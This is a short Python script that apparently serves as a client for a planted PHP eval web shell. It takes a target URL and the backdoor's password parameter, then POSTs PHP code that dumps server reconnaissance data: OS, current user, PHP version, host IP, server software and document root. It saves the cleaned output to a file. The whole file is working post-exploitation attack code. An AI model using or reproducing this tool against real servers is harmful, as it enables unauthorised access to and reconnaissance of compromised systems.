import requests
import os
import re
import sys

url = sys.argv[1]
password = sys.argv[2]
store_filename = sys.argv[3]
value = "echo php_uname().'<br/>';echo php_sapi_name().'<br/>';echo Get_Current_User().'<br/>';echo PHP_VERSION.'<br/>';echo DEFAULT_INCLUDE_PATH.'<br/>';echo __FILE__.'<br/>';echo GetHostByName($_SERVER['SERVER_NAME']).'<br/>';echo $_SERVER['SERVER_SOFTWARE'].'<br/>';echo $_SERVER['SystemRoot'].'<br/>';echo $_SERVER['SERVER_PROTOCOL'].'<br/>';echo $_SERVER['DOCUMENT_ROOT'];"

data = {password:value}
lines = ''
html = requests.post(url=url,data=data)
r = html.content

with open('systeminfo-php-temp.txt','wb') as f:
	f.write(r)
	
with open('systeminfo-php-temp.txt','r+') as fs:
	line = fs.read()
	lines = line.replace('<br/>',',')
	lines = re.sub(r'(\d+): eval()\'d code','',lines)
os.remove('systeminfo-php-temp.txt')	
with open(store_filename,'w') as fs1:
	fs1.write(lines)